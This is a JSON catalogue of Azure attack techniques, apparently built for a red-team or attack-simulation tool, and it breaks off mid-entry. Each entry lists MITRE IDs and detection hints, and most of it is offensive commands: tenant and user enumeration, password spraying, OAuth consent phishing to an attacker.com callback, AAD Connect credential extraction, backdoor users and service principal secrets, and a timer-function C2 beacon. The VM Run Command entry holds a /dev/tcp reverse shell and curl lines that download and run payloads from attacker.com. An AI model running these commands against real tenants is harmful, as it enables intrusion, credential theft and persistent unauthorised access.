{
  "infrastructure": "azure",
  "name": "Azure Cloud Attack Techniques",
  "version": "1.0.0",
  "techniques": [
    {
      "id": "AZ-RECON-001",
      "mitre_id": "T1589.001",
      "name": "Azure AD Tenant Enumeration",
      "phase": "reconnaissance",
      "infrastructure": "azure",
      "description": "Enumerate Azure AD tenant information, domains, and federation settings",
      "prerequisites": ["Target domain or tenant name"],
      "tools": ["AADInternals", "o365creeper", "MicroBurst"],
      "detection": "Azure AD sign-in logs, unusual enumeration patterns",
      "references": ["https://attack.mitre.org/techniques/T1589/001/"],
      "next_techniques": ["AZ-RECON-002", "AZ-INIT-001"],
      "risk_level": "low",
      "commands": [
        "# AADInternals - Get tenant info from domain name",
        "Get-AADIntLoginInformation -Domain target.com",
        "# AADInternals - Get tenant ID from domain",
        "Get-AADIntTenantID -Domain target.com",
        "# AADInternals - Get tenant domains",
        "Get-AADIntTenantDomains -Domain target.com",
        "# AADInternals - Check if domain uses federation",
        "Get-AADIntUserRealmV2 -UserName user@target.com",
        "# AADInternals - Get OpenID configuration",
        "Get-AADIntOpenIDConfiguration -Domain target.com",
        "# Check tenant existence via OpenID Connect metadata",
        "curl https://login.microsoftonline.com/target.com/.well-known/openid-configuration",
        "# Check tenant existence via autodiscover",
        "curl https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc -H 'Content-Type: text/xml' -d '<Autodiscover/>'",
        "# MicroBurst - Enumerate Azure blob storage",
        "Invoke-EnumerateAzureBlobs -Base targetcompany",
        "# MicroBurst - Enumerate subdomains",
        "Invoke-EnumerateAzureSubDomains -Base targetcompany",
        "# o365creeper - Check if emails exist",
        "python o365creeper.py -f emails.txt -o valid_emails.txt",
        "# Check federation metadata",
        "curl https://login.microsoftonline.com/target.com/FederationMetadata/2007-06/FederationMetadata.xml"
      ]
    },
    {
      "id": "AZ-RECON-002",
      "mitre_id": "T1087.004",
      "name": "Azure AD User Enumeration",
      "phase": "reconnaissance",
      "infrastructure": "azure",
      "description": "Enumerate Azure AD users, groups, and service principals via Graph API or legacy endpoints",
      "prerequisites": ["Valid Azure AD credentials or public tenant"],
      "tools": ["ROADtools", "AzureHound", "AADInternals"],
      "detection": "Azure AD audit logs, Graph API call patterns",
      "references": ["https://attack.mitre.org/techniques/T1087/004/"],
      "next_techniques": ["AZ-INIT-002", "AZ-PRIVESC-001"],
      "risk_level": "low",
      "commands": [
        "# Azure CLI - List all users in the tenant",
        "az ad user list --output table",
        "# Azure CLI - Get specific user details",
        "az ad user show --id user@target.com",
        "# Azure CLI - List all groups",
        "az ad group list --output table",
        "# Azure CLI - List service principals",
        "az ad sp list --all --output table",
        "# Azure PowerShell - Get all Azure AD users",
        "Get-AzureADUser -All $true",
        "# Azure PowerShell - Get all groups",
        "Get-AzureADGroup -All $true",
        "# Azure PowerShell - Get service principals",
        "Get-AzureADServicePrincipal -All $true",
        "# ROADtools - Authenticate and gather all data",
        "roadrecon auth -u user@target.com -p 'password'",
        "roadrecon gather",
        "# ROADtools - Start GUI for analysis",
        "roadrecon gui",
        "# AzureHound - Collect Azure AD data",
        "azurehound -u user@target.com -p 'password' list users",
        "azurehound -u user@target.com -p 'password' list groups",
        "# AADInternals - Get users with access token",
        "Get-AADIntUsers -AccessToken $token",
        "# AADInternals - Get all Azure AD groups",
        "Get-AADIntAADGroups -AccessToken $token",
        "# Microsoft Graph API - List users",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/users'",
        "# Microsoft Graph API - List service principals",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/servicePrincipals'"
      ]
    },
    {
      "id": "AZ-RECON-003",
      "mitre_id": "T1526",
      "name": "Azure Storage Enumeration",
      "phase": "reconnaissance",
      "infrastructure": "azure",
      "description": "Enumerate Azure storage accounts and blob containers for public or misconfigured access",
      "prerequisites": ["Target organization name"],
      "tools": ["MicroBurst", "BlobHunter", "Azure CLI"],
      "detection": "Storage account access logs, unusual enumeration patterns",
      "references": ["https://attack.mitre.org/techniques/T1526/"],
      "next_techniques": ["AZ-COLL-001"],
      "risk_level": "low",
      "commands": [
        "# MicroBurst - Enumerate Azure blobs with common names",
        "Invoke-EnumerateAzureBlobs -Base targetcompany",
        "# MicroBurst - Enumerate Azure blobs with permutations",
        "Invoke-EnumerateAzureBlobs -Base targetcompany -Permutations",
        "# Azure CLI - List storage accounts in subscription",
        "az storage account list --output table",
        "# Azure CLI - List containers in a storage account",
        "az storage container list --account-name targetstorageaccount --output table",
        "# Azure CLI - List blobs in a container",
        "az storage blob list --account-name targetstorageaccount --container-name containername --output table",
        "# Azure CLI - Check anonymous access to blob",
        "az storage blob exists --account-name targetstorageaccount --container-name containername --name blobname --auth-mode key",
        "# Check for public blob access (no auth required)",
        "curl https://targetstorageaccount.blob.core.windows.net/containername?restype=container&comp=list",
        "# BlobHunter - Scan for publicly accessible blobs",
        "python blobhunter.py -n targetcompany -o output.txt",
        "# Azure PowerShell - Get storage account keys (if authorized)",
        "Get-AzStorageAccountKey -ResourceGroupName rg-name -Name storageaccountname",
        "# Azure PowerShell - List containers",
        "Get-AzStorageContainer -Context $ctx",
        "# Check for anonymous table access",
        "curl 'https://targetstorageaccount.table.core.windows.net/Tables'",
        "# Check for anonymous queue access",
        "curl 'https://targetstorageaccount.queue.core.windows.net?comp=list'",
        "# Check for anonymous file share access",
        "curl 'https://targetstorageaccount.file.core.windows.net?comp=list'"
      ]
    },
    {
      "id": "AZ-RECON-004",
      "mitre_id": "T1580",
      "name": "Azure Resource Enumeration",
      "phase": "reconnaissance",
      "infrastructure": "azure",
      "description": "Enumerate Azure subscriptions, resource groups, and resources using authenticated access",
      "prerequisites": ["Valid Azure credentials with Reader role"],
      "tools": ["Azure CLI", "Az PowerShell", "ROADtools"],
      "detection": "Azure Activity Logs, resource enumeration API calls",
      "references": ["https://attack.mitre.org/techniques/T1580/"],
      "next_techniques": ["AZ-DISC-001", "AZ-PRIVESC-001"],
      "risk_level": "low",
      "commands": [
        "# Azure CLI - List all subscriptions",
        "az account list --output table",
        "# Azure CLI - Set current subscription",
        "az account set --subscription 'subscription-id-or-name'",
        "# Azure CLI - List all resource groups",
        "az group list --output table",
        "# Azure CLI - List all resources in subscription",
        "az resource list --output table",
        "# Azure CLI - List VMs",
        "az vm list --output table",
        "# Azure CLI - List App Services",
        "az webapp list --output table",
        "# Azure CLI - List Key Vaults",
        "az keyvault list --output table",
        "# Azure CLI - List SQL servers",
        "az sql server list --output table",
        "# Azure PowerShell - Get subscriptions",
        "Get-AzSubscription",
        "# Azure PowerShell - Set subscription context",
        "Set-AzContext -SubscriptionId 'subscription-id'",
        "# Azure PowerShell - Get all resources",
        "Get-AzResource",
        "# Azure PowerShell - Get VMs with details",
        "Get-AzVM -Status",
        "# Azure PowerShell - Get network interfaces",
        "Get-AzNetworkInterface",
        "# Azure PowerShell - Get public IP addresses",
        "Get-AzPublicIpAddress",
        "# ROADtools - Dump Azure resources after auth",
        "roadrecon plugin azurerm",
        "# AzureHound - Comprehensive resource enumeration",
        "azurehound -u user@target.com list --tenant tenant-id"
      ]
    },
    {
      "id": "AZ-INIT-001",
      "mitre_id": "T1566.002",
      "name": "OAuth Consent Phishing",
      "phase": "initial_access",
      "infrastructure": "azure",
      "description": "Trick users into granting OAuth consent to malicious applications for token access",
      "prerequisites": ["Malicious app registration", "Target user list"],
      "tools": ["365-Stealer", "Custom OAuth apps"],
      "detection": "Azure AD consent grant logs, risky app detections",
      "references": ["https://attack.mitre.org/techniques/T1566/002/"],
      "next_techniques": ["AZ-CRED-001", "AZ-PERSIST-001"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - Register a new application",
        "az ad app create --display-name 'Legitimate Looking App' --reply-urls 'https://attacker.com/callback'",
        "# Azure CLI - Add API permissions to app",
        "az ad app permission add --id <app-id> --api 00000003-0000-0000-c000-000000000000 --api-permissions e1fe6dd8-ba31-4d61-89e7-88639da4683d=Scope",
        "# Azure PowerShell - Create application",
        "New-AzureADApplication -DisplayName 'Legitimate App' -ReplyUrls 'https://attacker.com/callback'",
        "# Azure PowerShell - Add OAuth2 permissions",
        "Add-AzureADApplicationPermission -ObjectId <app-object-id> -ApiId '00000003-0000-0000-c000-000000000000' -PermissionId 'e1fe6dd8-ba31-4d61-89e7-88639da4683d'",
        "# Generate OAuth consent URL",
        "# URL format: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<app-id>&response_type=code&redirect_uri=https://attacker.com/callback&scope=openid+profile+email+User.Read+Mail.Read",
        "# 365-Stealer - Start phishing server",
        "python 365-Stealer.py --client-id <app-id> --client-secret <secret>",
        "# AADInternals - Create backdoor application",
        "New-AADIntBackdoor -DomainName target.onmicrosoft.com",
        "# TokenTactics - Forge device code phishing",
        "Import-Module TokenTactics.psd1",
        "Get-DeviceCodeFlow -ClientId <app-id> -Scope 'https://graph.microsoft.com/.default'",
        "# Capture tokens from redirect",
        "# Access token will be in URL fragment after user consent"
      ]
    },
    {
      "id": "AZ-INIT-002",
      "mitre_id": "T1110.003",
      "name": "Azure AD Password Spraying",
      "phase": "initial_access",
      "infrastructure": "azure",
      "description": "Spray common passwords against Azure AD accounts to find valid credentials",
      "prerequisites": ["List of valid usernames"],
      "tools": ["MSOLSpray", "Spray", "Ruler"],
      "detection": "Azure AD sign-in logs, Identity Protection risky sign-ins",
      "references": ["https://attack.mitre.org/techniques/T1110/003/"],
      "next_techniques": ["AZ-EXEC-001", "AZ-RECON-002"],
      "risk_level": "medium",
      "commands": [
        "# MSOLSpray - Password spray with single password",
        "Invoke-MSOLSpray -UserList users.txt -Password 'Winter2024!'",
        "# MSOLSpray - Spray with URL specification",
        "Invoke-MSOLSpray -UserList users.txt -Password 'Company123!' -URL 'https://login.microsoftonline.com'",
        "# Spray.py - Python password spraying",
        "python spray.py --spray -U users.txt -p 'Summer2024!' -d target.com",
        "# Ruler - Exchange password spray",
        "ruler --domain target.com brute --users users.txt --passwords passwords.txt",
        "# o365spray - O365 user enumeration and spray",
        "python o365spray.py --spray -U users.txt -p 'Welcome1!' --domain target.com",
        "# o365spray - Enumerate valid users first",
        "python o365spray.py --enum -U users.txt --domain target.com",
        "# CredMaster - AWS Lambda-based password spray (evade IP blocks)",
        "python credmaster.py --spray -u users.txt -p passwords.txt --plugin msol",
        "# Spray with delays to avoid lockout (PowerShell)",
        "foreach($user in Get-Content users.txt) { Start-Sleep -Seconds 30; Invoke-WebRequest ... }",
        "# TeamFiltration - Modern O365 spray",
        "TeamFiltration --spray --users users.txt --password 'Password123!' --outpath ./results",
        "# Check Azure AD Smart Lockout threshold (recon)",
        "# Note: Default is 10 failed attempts, reset after 60 seconds"
      ]
    },
    {
      "id": "AZ-INIT-003",
      "mitre_id": "T1078.004",
      "name": "Compromised Azure Credentials",
      "phase": "initial_access",
      "infrastructure": "azure",
      "description": "Use stolen Azure AD credentials or service principal secrets from leaks or phishing",
      "prerequisites": ["Leaked credentials"],
      "tools": ["Azure CLI", "Az PowerShell", "ROADtools"],
      "detection": "Azure AD sign-in logs, unusual location/device",
      "references": ["https://attack.mitre.org/techniques/T1078/004/"],
      "next_techniques": ["AZ-RECON-004", "AZ-EXEC-001"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - Login with stolen user credentials",
        "az login -u user@target.com -p 'stolen-password'",
        "# Azure CLI - Login with service principal",
        "az login --service-principal -u <app-id> -p <secret> --tenant <tenant-id>",
        "# Azure CLI - Login with certificate",
        "az login --service-principal -u <app-id> -p /path/to/cert.pem --tenant <tenant-id>",
        "# Azure PowerShell - Login with credentials",
        "$cred = New-Object PSCredential('user@target.com', (ConvertTo-SecureString 'password' -AsPlainText -Force))",
        "Connect-AzAccount -Credential $cred",
        "# Azure PowerShell - Login with service principal secret",
        "$cred = New-Object PSCredential('<app-id>', (ConvertTo-SecureString '<secret>' -AsPlainText -Force))",
        "Connect-AzAccount -ServicePrincipal -Credential $cred -TenantId '<tenant-id>'",
        "# ROADtools - Authenticate with stolen creds",
        "roadrecon auth -u user@target.com -p 'password'",
        "# ROADtools - Authenticate with access token",
        "roadrecon auth --access-token <token>",
        "# AADInternals - Get access token with credentials",
        "Get-AADIntAccessTokenForAADGraph -Credentials (Get-Credential)",
        "# TokenTactics - Use refresh token to get access tokens",
        "Import-Module TokenTactics.psd1",
        "RefreshTo-MSGraph -RefreshToken $RefreshToken -TenantId <tenant-id>",
        "# Verify authentication worked",
        "az account show"
      ]
    },
    {
      "id": "AZ-INIT-004",
      "mitre_id": "T1199",
      "name": "Azure AD Connect Abuse",
      "phase": "initial_access",
      "infrastructure": "azure",
      "description": "Compromise Azure AD Connect server to gain cloud admin access via sync account",
      "prerequisites": ["Access to Azure AD Connect server"],
      "tools": ["AADInternals", "Mimikatz", "Custom scripts"],
      "detection": "Azure AD Connect health alerts, sync account usage",
      "references": ["https://attack.mitre.org/techniques/T1199/"],
      "next_techniques": ["AZ-PRIVESC-003", "AZ-CRED-003"],
      "risk_level": "critical",
      "commands": [
        "# AADInternals - Get sync credentials from AAD Connect server",
        "Get-AADIntSyncCredentials",
        "# AADInternals - Get DPAPI credentials",
        "Get-AADIntSyncCredentials -AsBackgroundTask",
        "# AADInternals - Export AADC config",
        "Export-AADIntADConnectConfiguration",
        "# AADInternals - Pass-through authentication abuse",
        "Install-AADIntPTASpy",
        "# AADInternals - Get PTA agent credentials",
        "Get-AADIntPTACredentials",
        "# AADInternals - Set sync feature (Password Hash Sync)",
        "Set-AADIntSyncFeature -Feature PasswordHashSync -Enabled $true -AccessToken $token",
        "# Mimikatz - Extract DPAPI secrets from AAD Connect",
        "sekurlsa::dpapi",
        "# ADSyncDecrypt - Decrypt AAD Connect credentials",
        "ADSyncDecrypt.exe -FullSQL",
        "# Use sync account to reset cloud user password",
        "Set-AADIntUserPassword -SourceAnchor '<source-anchor>' -Password 'NewPassword123!' -AccessToken $token",
        "# Check AAD Connect sync status",
        "Get-ADSyncAADCompanyFeature",
        "# List pending exports in AAD Connect",
        "Get-ADSyncConnectorRunStatus",
        "# DCSync-style attack using sync account",
        "Get-AADIntSyncObjects -AccessToken $token"
      ]
    },
    {
      "id": "AZ-EXEC-001",
      "mitre_id": "T1059.001",
      "name": "Azure PowerShell Execution",
      "phase": "execution",
      "infrastructure": "azure",
      "description": "Execute Azure PowerShell or CLI commands using compromised credentials",
      "prerequisites": ["Valid Azure credentials"],
      "tools": ["Az PowerShell", "Azure CLI", "ROADtools"],
      "detection": "Azure Activity Logs, unusual management operations",
      "references": ["https://attack.mitre.org/techniques/T1059/001/"],
      "next_techniques": ["AZ-PERSIST-001", "AZ-PRIVESC-001"],
      "risk_level": "medium",
      "commands": [
        "# Azure CLI - Authenticate interactively",
        "az login",
        "# Azure CLI - Execute subscription operations",
        "az account list",
        "# Azure CLI - Create resources",
        "az vm create --resource-group rg-name --name vmname --image UbuntuLTS",
        "# Azure CLI - Execute Graph API calls",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/me'",
        "# Azure PowerShell - Connect to Azure",
        "Connect-AzAccount",
        "# Azure PowerShell - Execute ARM operations",
        "Get-AzResource",
        "# Azure PowerShell - Connect to Azure AD",
        "Connect-AzureAD",
        "# Azure PowerShell - Run ARM template deployment",
        "New-AzResourceGroupDeployment -ResourceGroupName rg-name -TemplateFile template.json",
        "# Connect to Microsoft Graph",
        "Connect-MgGraph -Scopes 'User.Read.All'",
        "# Execute inline PowerShell via Azure Automation",
        "Start-AzAutomationRunbook -ResourceGroupName rg -AutomationAccountName aa -Name runbook",
        "# ROADtools - Execute operations with gathered data",
        "roadrecon gather --tokens-file tokens.json",
        "# Use Azure Cloud Shell (if available)",
        "# Access via: https://shell.azure.com",
        "# Execute commands in browser-based shell"
      ]
    },
    {
      "id": "AZ-EXEC-002",
      "mitre_id": "T1059",
      "name": "VM Run Command Execution",
      "phase": "execution",
      "infrastructure": "azure",
      "description": "Use Azure VM Run Command to execute scripts on virtual machines",
      "prerequisites": ["VM Contributor role or equivalent"],
      "tools": ["Azure CLI", "Az PowerShell", "Azure Portal"],
      "detection": "Azure Activity Logs, VM Run Command audit",
      "references": ["https://attack.mitre.org/techniques/T1059/"],
      "next_techniques": ["AZ-CRED-002", "AZ-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - Run shell command on Linux VM",
        "az vm run-command invoke --resource-group rg-name --name vmname --command-id RunShellScript --scripts 'whoami; id; cat /etc/passwd'",
        "# Azure CLI - Run PowerShell command on Windows VM",
        "az vm run-command invoke --resource-group rg-name --name vmname --command-id RunPowerShellScript --scripts 'Get-Process; Get-Service'",
        "# Azure CLI - Run script from file",
        "az vm run-command invoke --resource-group rg-name --name vmname --command-id RunShellScript --scripts @script.sh",
        "# Azure CLI - Run command with parameters",
        "az vm run-command invoke --resource-group rg-name --name vmname --command-id RunShellScript --scripts 'echo $1' --parameters 'arg1=value1'",
        "# Azure PowerShell - Run command on VM",
        "Invoke-AzVMRunCommand -ResourceGroupName rg-name -VMName vmname -CommandId RunPowerShellScript -ScriptPath ./script.ps1",
        "# Azure PowerShell - Run inline script",
        "Invoke-AzVMRunCommand -ResourceGroupName rg-name -VMName vmname -CommandId RunShellScript -ScriptString 'curl http://attacker.com/shell.sh | bash'",
        "# Run command on VM Scale Set instance",
        "az vmss run-command invoke --resource-group rg-name --name vmssname --instance-id 0 --command-id RunShellScript --scripts 'id'",
        "# Reverse shell via run command (Linux)",
        "az vm run-command invoke --resource-group rg-name --name vmname --command-id RunShellScript --scripts 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'",
        "# Download and execute payload",
        "az vm run-command invoke --resource-group rg-name --name vmname --command-id RunShellScript --scripts 'curl http://attacker.com/payload.sh -o /tmp/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh'"
      ]
    },
    {
      "id": "AZ-EXEC-003",
      "mitre_id": "T1648",
      "name": "Azure Function Code Injection",
      "phase": "execution",
      "infrastructure": "azure",
      "description": "Modify Azure Function code to execute malicious payloads",
      "prerequisites": ["Function app write permissions"],
      "tools": ["Azure CLI", "Az PowerShell"],
      "detection": "Azure Activity Logs, Function deployment events",
      "references": ["https://attack.mitre.org/techniques/T1648/"],
      "next_techniques": ["AZ-PERSIST-003", "AZ-CRED-004"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - List function apps",
        "az functionapp list --output table",
        "# Azure CLI - Get function app configuration",
        "az functionapp config show --name funcappname --resource-group rg-name",
        "# Azure CLI - Deploy malicious function code",
        "az functionapp deployment source config-zip --resource-group rg-name --name funcappname --src malicious.zip",
        "# Azure CLI - Update function app settings (inject env vars)",
        "az functionapp config appsettings set --name funcappname --resource-group rg-name --settings 'MALICIOUS_VAR=payload'",
        "# Azure CLI - Get function master key (for API access)",
        "az functionapp keys list --name funcappname --resource-group rg-name",
        "# Azure PowerShell - Get function app",
        "Get-AzFunctionApp -Name funcappname -ResourceGroupName rg-name",
        "# Azure PowerShell - Publish function",
        "Publish-AzWebApp -ResourceGroupName rg-name -Name funcappname -ArchivePath ./malicious.zip",
        "# Modify function.json to change trigger",
        "az functionapp deployment source config --resource-group rg-name --name funcappname --repo-url https://github.com/attacker/malicious-func",
        "# Inject code via Kudu API (get credentials first)",
        "az functionapp deployment list-publishing-credentials --name funcappname --resource-group rg-name",
        "# Use SCM endpoint to deploy",
        "curl -X POST -u 'username:password' https://funcappname.scm.azurewebsites.net/api/zipdeploy -T malicious.zip",
        "# List existing functions",
        "az functionapp function list --name funcappname --resource-group rg-name"
      ]
    },
    {
      "id": "AZ-PERSIST-001",
      "mitre_id": "T1098.001",
      "name": "Service Principal Secret Addition",
      "phase": "persistence",
      "infrastructure": "azure",
      "description": "Add credentials to existing service principals for persistent access",
      "prerequisites": ["Application Administrator or app owner role"],
      "tools": ["Azure CLI", "Az PowerShell", "ROADtools"],
      "detection": "Azure AD audit logs, service principal credential changes",
      "references": ["https://attack.mitre.org/techniques/T1098/001/"],
      "next_techniques": ["AZ-EXEC-001"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - Add secret to existing app",
        "az ad app credential reset --id <app-id> --append --years 2",
        "# Azure CLI - Add certificate credential",
        "az ad app credential reset --id <app-id> --cert @cert.pem --append",
        "# Azure CLI - Create new secret with custom end date",
        "az ad app credential reset --id <app-id> --append --end-date '2026-12-31'",
        "# Azure CLI - Add secret to service principal directly",
        "az ad sp credential reset --id <sp-id> --append",
        "# Azure PowerShell - Add password credential",
        "$cred = New-AzureADApplicationPasswordCredential -ObjectId <app-object-id> -CustomKeyIdentifier 'backdoor' -EndDate (Get-Date).AddYears(2)",
        "# Azure PowerShell - Add key credential (certificate)",
        "$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2('cert.cer')",
        "New-AzureADApplicationKeyCredential -ObjectId <app-object-id> -Type AsymmetricX509Cert -Usage Verify -Value $cert.GetRawCertData()",
        "# Microsoft Graph API - Add password credential",
        "az rest --method POST --url 'https://graph.microsoft.com/v1.0/applications/<app-id>/addPassword' --body '{\"passwordCredential\":{\"displayName\":\"backdoor\"}}'",
        "# ROADtools - Dump existing app credentials",
        "roadrecon plugin apps",
        "# List all credentials for an app",
        "az ad app credential list --id <app-id>",
        "# Find apps you can add credentials to",
        "az ad app list --filter \"owners/any(o:o/userPrincipalName eq 'user@target.com')\" --query '[].{appId:appId,displayName:displayName}'"
      ]
    },
    {
      "id": "AZ-PERSIST-002",
      "mitre_id": "T1136.003",
      "name": "Azure AD User Creation",
      "phase": "persistence",
      "infrastructure": "azure",
      "description": "Create new Azure AD users or guest accounts for persistent access",
      "prerequisites": ["User Administrator role"],
      "tools": ["Azure CLI", "Az PowerShell", "Graph API"],
      "detection": "Azure AD audit logs, new user creation events",
      "references": ["https://attack.mitre.org/techniques/T1136/003/"],
      "next_techniques": ["AZ-PRIVESC-001"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - Create new Azure AD user",
        "az ad user create --display-name 'Service Account' --user-principal-name svc_account@target.onmicrosoft.com --password 'StrongP@ssw0rd!'",
        "# Azure CLI - Create user with specific properties",
        "az ad user create --display-name 'IT Support' --user-principal-name it.support@target.onmicrosoft.com --password 'P@ssword1!' --force-change-password-next-sign-in false",
        "# Azure CLI - Invite guest user",
        "az ad user create --user-type Guest --display-name 'External Contractor' --user-principal-name 'contractor@external.com#EXT#@target.onmicrosoft.com'",
        "# Azure PowerShell - Create user",
        "$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile",
        "$PasswordProfile.Password = 'StrongP@ss!'",
        "New-AzureADUser -DisplayName 'Backdoor User' -PasswordProfile $PasswordProfile -UserPrincipalName backdoor@target.onmicrosoft.com -AccountEnabled $true -MailNickName 'backdoor'",
        "# Azure PowerShell - Invite guest user",
        "New-AzureADMSInvitation -InvitedUserEmailAddress 'attacker@evil.com' -InviteRedirectUrl 'https://myapps.microsoft.com' -SendInvitationMessage $true",
        "# Microsoft Graph API - Create user",
        "az rest --method POST --url 'https://graph.microsoft.com/v1.0/users' --body '{\"displayName\":\"svc_acct\",\"userPrincipalName\":\"svc@target.onmicrosoft.com\",\"passwordProfile\":{\"password\":\"P@ss!\"}}'",
        "# Create user and add to admin group in one flow",
        "$user = az ad user create --display-name 'Admin Svc' --user-principal-name admin_svc@target.onmicrosoft.com --password 'P@ss!'",
        "az ad group member add --group 'Global Administrators' --member-id $user.id",
        "# Hide user from GAL (Global Address List)",
        "Set-AzureADUser -ObjectId <user-id> -ShowInAddressList $false"
      ]
    },
    {
      "id": "AZ-PERSIST-003",
      "mitre_id": "T1098",
      "name": "Azure Function Timer Backdoor",
      "phase": "persistence",
      "infrastructure": "azure",
      "description": "Create Azure Function with timer trigger for persistent callback",
      "prerequisites": ["Function app Contributor role"],
      "tools": ["Azure CLI", "Az PowerShell"],
      "detection": "Azure Activity Logs, Function creation events",
      "references": ["https://attack.mitre.org/techniques/T1098/"],
      "next_techniques": ["AZ-CRED-004"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - Create function app for persistence",
        "az functionapp create --resource-group rg-name --consumption-plan-location eastus --runtime python --runtime-version 3.9 --functions-version 4 --name backdoor-func --storage-account storageacct",
        "# Create function.json with timer trigger (runs every 5 minutes)",
        "# function.json content: {\"bindings\":[{\"name\":\"timer\",\"type\":\"timerTrigger\",\"direction\":\"in\",\"schedule\":\"0 */5 * * * *\"}]}",
        "# Deploy function with malicious code",
        "func azure functionapp publish backdoor-func",
        "# Azure CLI - Create function app with system-assigned managed identity",
        "az functionapp identity assign --resource-group rg-name --name backdoor-func",
        "# Grant managed identity access to resources",
        "az role assignment create --assignee <managed-identity-principal-id> --role Contributor --scope /subscriptions/<sub-id>",
        "# Example Python timer function for C2 callback",
        "# __init__.py: import requests; def main(timer): requests.get('https://attacker.com/beacon?id='+os.environ['WEBSITE_SITE_NAME'])",
        "# Azure PowerShell - Create function app",
        "New-AzFunctionApp -ResourceGroupName rg-name -Name backdoor-func -Location eastus -Runtime Python -RuntimeVersion 3.9 -FunctionsVersion 4 -StorageAccountName storageacct",
        "# Set environment variables for C2",
        "az functionapp config appsettings set --name backdoor-func --resource-group rg-name --settings 'C2_SERVER=https://attacker.com'",
        "# Enable continuous deployment from attacker repo",
        "az functionapp deployment source config --name backdoor-func --resource-group rg-name --repo-url https://github.com/attacker/backdoor --branch main"
      ]
    },
    {
      "id": "AZ-PERSIST-004",
      "mitre_id": "T1098.003",
      "name": "Federated Identity Credential Abuse",
      "phase": "persistence",
      "infrastructure": "azure",
      "description": "Add federated identity credentials to apps for external IdP trust",
      "prerequisites": ["Application Administrator role"],
      "tools": ["Azure CLI", "Graph API"],
      "detection": "Azure AD audit logs, federation changes",
      "references": ["https://attack.mitre.org/techniques/T1098/003/"],
      "next_techniques": ["AZ-EXEC-001"],
      "risk_level": "critical",
      "commands": [
        "# Azure CLI - Add federated identity credential (GitHub Actions)",
        "az ad app federated-credential create --id <app-id> --parameters '{\"name\":\"github-deploy\",\"issuer\":\"https://token.actions.githubusercontent.com\",\"subject\":\"repo:attacker/repo:ref:refs/heads/main\",\"audiences\":[\"api://AzureADTokenExchange\"]}'",
        "# Azure CLI - Add federated credential for AWS",
        "az ad app federated-credential create --id <app-id> --parameters '{\"name\":\"aws-trust\",\"issuer\":\"https://sts.amazonaws.com\",\"subject\":\"arn:aws:iam::123456789012:role/attacker-role\",\"audiences\":[\"api://AzureADTokenExchange\"]}'",
        "# Azure CLI - Add federated credential for Kubernetes",
        "az ad app federated-credential create --id <app-id> --parameters '{\"name\":\"k8s-trust\",\"issuer\":\"https://attacker-k8s.com\",\"subject\":\"system:serviceaccount:default:backdoor-sa\",\"audiences\":[\"api://AzureADTokenExchange\"]}'",
        "# List existing federated credentials",
        "az ad app federated-credential list --id <app-id>",
        "# Microsoft Graph API - Create federated identity credential",
        "az rest --method POST --url 'https://graph.microsoft.com/v1.0/applications/<app-object-id>/federatedIdentityCredentials' --body '{\"name\":\"backdoor\",\"issuer\":\"https://attacker-idp.com\",\"subject\":\"attacker\",\"audiences\":[\"api://AzureADTokenExchange\"]}'",
        "# Azure PowerShell - Add federated credential",
        "New-AzADAppFederatedCredential -ApplicationObjectId <app-object-id> -Name 'backdoor' -Issuer 'https://attacker-idp.com' -Subject 'attacker' -Audience 'api://AzureADTokenExchange'",
        "# Get token using federated identity (from external IdP)",
        "curl -X POST 'https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token' -d 'client_id=<app-id>&scope=https://graph.microsoft.com/.default&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=<external-idp-token>&grant_type=client_credentials'",
        "# This allows authentication without any Azure-stored secrets"
      ]
    },
    {
      "id": "AZ-PRIVESC-001",
      "mitre_id": "T1548",
      "name": "Azure Role Assignment Abuse",
      "phase": "privilege_escalation",
      "infrastructure": "azure",
      "description": "Assign elevated Azure RBAC roles to controlled identities",
      "prerequisites": ["Owner or User Access Administrator role"],
      "tools": ["Azure CLI", "Az PowerShell"],
      "detection": "Azure Activity Logs, role assignment events",
      "references": ["https://attack.mitre.org/techniques/T1548/"],
      "next_techniques": ["AZ-EXEC-002", "AZ-CRED-001"],
      "risk_level": "critical",
      "commands": [
        "# Azure CLI - Assign Owner role at subscription level",
        "az role assignment create --assignee user@target.com --role Owner --scope /subscriptions/<subscription-id>",
        "# Azure CLI - Assign Contributor at resource group level",
        "az role assignment create --assignee <principal-id> --role Contributor --scope /subscriptions/<sub-id>/resourceGroups/<rg-name>",
        "# Azure CLI - Assign User Access Administrator (can then grant other roles)",
        "az role assignment create --assignee <principal-id> --role 'User Access Administrator' --scope /subscriptions/<subscription-id>",
        "# Azure CLI - Assign Key Vault admin for secret access",
        "az role assignment create --assignee <principal-id> --role 'Key Vault Administrator' --scope /subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault-name>",
        "# Azure PowerShell - Assign Owner role",
        "New-AzRoleAssignment -ObjectId <principal-id> -RoleDefinitionName Owner -Scope /subscriptions/<subscription-id>",
        "# Azure PowerShell - Assign custom role",
        "New-AzRoleAssignment -ObjectId <principal-id> -RoleDefinitionId <custom-role-id> -Scope /subscriptions/<subscription-id>",
        "# List current role assignments",
        "az role assignment list --assignee user@target.com --all --output table",
        "# Find users with Owner role",
        "az role assignment list --role Owner --all --output table",
        "# Assign role to managed identity",
        "az role assignment create --assignee-object-id <managed-identity-principal-id> --assignee-principal-type ServicePrincipal --role Contributor --scope /subscriptions/<sub-id>",
        "# Create custom role with dangerous permissions",
        "az role definition create --role-definition '{\"Name\":\"Backdoor Admin\",\"Actions\":[\"*\"],\"AssignableScopes\":[\"/subscriptions/<sub-id>\"]}'",
        "# Escalate via Azure Lighthouse (cross-tenant)",
